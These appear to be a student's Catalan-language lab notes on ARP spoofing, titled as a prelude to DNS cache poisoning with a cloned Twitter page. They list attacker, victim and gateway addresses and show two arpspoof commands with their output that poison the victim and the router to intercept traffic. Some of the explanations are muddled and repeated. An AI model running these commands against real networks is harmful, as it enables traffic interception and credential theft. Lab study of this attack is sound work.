ARP Spoof - DNS Cache Poisoning

IP Atacant. 10.200.243.137 
MAC Atacant: 08:00:27:16:51:52

IP Victima: 10.200.243.212
MAC Victima: 18:c0:4d:a0:8f:c8

IP Router Gateway: 10.200.243.1
MAC Router Gateway: 00:22:57:be:53:01

Pàgina clonada: http://www.twitter.com


SPOOF del tràfic entre la VÍCTIMA I EL ROUTER --> ES CANVIA LA MAC DEL CLIENT VICTIMA PER LA MEVA: 18:c0:4d:a0:8f:c8 PER LA MEVA (ATACANT): 08:00:27:16:51:52.

EN REALITAT QUI CONECTA AMB EL SERVIDOR, SOC JO NO LA VÍCTIMA. FEM LA TORNADA.
 
└─# arpspoof -i eth0 -t 10.200.243.212 10.200.243.1
8:0:27:16:51:52 18:c0:4d:a0:8f:c8 0806 42: arp reply 10.200.243.1 is-at 8:0:27:16:51:52

"Tot el fluxe que va del servidor a la víctima, redirigeix-los a la meva màquina"

TORNADA

SPOOF del tràfic entre la EL ROUTER I LA VICTIMA --> ES CANVIA LA MAC DEL DEL ROUTER PER LA MEVA: 0:22:57:be:53:1 PER LA MEVA (ATACANT): 08:00:27:16:51:52.

EN REALITAT QUI CONECTA AMB EL SERVIDOR, SOC JO NO LA VÍCTIMA. FEM LA TORNADA.

┌──(root㉿osboxes)-[/home/anonymous]
└─# arpspoof -i eth0 -t 10.200.243.1 10.200.243.212
8:0:27:16:51:52 0:22:57:be:53:1 0806 42: arp reply 10.200.243.212 is-at 8:0:27:16:51:52
8:0:27:16:51:52 0:22:57:be:53:1 0806 42: arp reply 10.200.243.212 is-at 8:0:27:16:51:52

"Tot el fluxe que va de la víctima al servidor, redirigeix-los a la meva màquina"


RESUM: TOT EL TRÀFIC DE PAQUETS QUE SURT DE LA VÍCTIMA AL SERVIDOR, SERÀN "FORWARD" AL MEU CLIENT ATACANT. JA QUE EL LA VÍCTIMA CREU QUE QUI CONTACTA ES AL ROUTER, PERO NO. SUPLANTO LA MAC DESTÍ DEL ROUTER PER LA MEVA.


